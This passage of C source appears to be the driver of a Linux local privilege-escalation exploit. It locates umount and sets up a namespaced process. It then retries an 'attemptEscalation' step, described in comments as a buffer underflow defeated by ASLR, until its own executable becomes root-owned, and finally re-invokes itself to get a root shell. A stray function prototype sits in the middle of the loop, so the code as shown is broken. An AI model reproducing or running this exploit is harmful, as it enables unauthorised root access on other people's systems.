        fprintf(stderr, "Invalid pid value\n");
        return(1);
      }
      killNamespacedProcessFlag=0;
    } else {
      fprintf(stderr, "Unknown argument %s\n", argName);
      return(1);
    }
  }

  fprintf(stderr, "%s: setting up environment ...\n", programmName);

  if(!osRelease) {
    if(detectOsRelease()) {
      fprintf(stderr, "Failed to detect OS version, continuing anyway\n");
    }
  }

  umountPathname=findUmountBinaryPathname("/bin");
  if((!umountPathname)&&(getenv("PATH")))
    umountPathname=findUmountBinaryPathname(getenv("PATH"));
  if(!umountPathname) {
    fprintf(stderr, "Failed to locate \"umount\" binary, is PATH correct?\n");
    goto preReturnCleanup;
  }
  fprintf(stderr, "%s: using umount at \"%s\".\n", programmName,
      umountPathname);

  pid_t nsPid=prepareNamespacedProcess();
  if(nsPid<0) {
    goto preReturnCleanup;
  }

// Gaining root can still fail due to ASLR creating additional
// path separators in memory addresses residing in area to be
// overwritten by buffer underflow. Retry regaining until this
// executable changes uid/gid.
  int escalateMaxAttempts=10;
  int excalateCurrentAttempt=0;
  while(excalateCurrentAttempt<escalateMaxAttempts) {
    excalateCurrentAttempt++;
    fprintf(stderr, "Attempting to gain root, try %d of %d ...\n",
        excalateCurrentAttempt, escalateMaxAttempts);

    attemptEscalation();

    struct stat statBuf;
    int statResult=stat("/proc/self/exe", &statBuf);
       int stat(const char *pathname, struct stat *buf);
    if(statResult) {
      fprintf(stderr, "Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\n");
      break;
    }
    if(statBuf.st_uid==0) {
      fprintf(stderr, "Executable now root-owned\n");
      goto escalateOk;
    }
  }

  fprintf(stderr, "Escalation FAILED, maybe target system not (yet) supported by exploit!\n");

preReturnCleanup:
  if(namespacedProcessPid>0) {
    if(killNamespacedProcessFlag) {
      kill(namespacedProcessPid, SIGKILL);
    } else {
// We used an existing namespace or chroot to escalate. Remove
// the files created there.
      fprintf(stderr, "No namespace cleanup for preexisting namespaces yet, do it manually.\n");
    }
  }

  if(!exitStatus) {
    fprintf(stderr, "Cleanup completed, re-invoking binary\n");
    invokeShell("/proc/self/exe");
    exitStatus=1;
  }
  return(exitStatus);

escalateOk:
  exitStatus=0;
  goto preReturnCleanup;
}
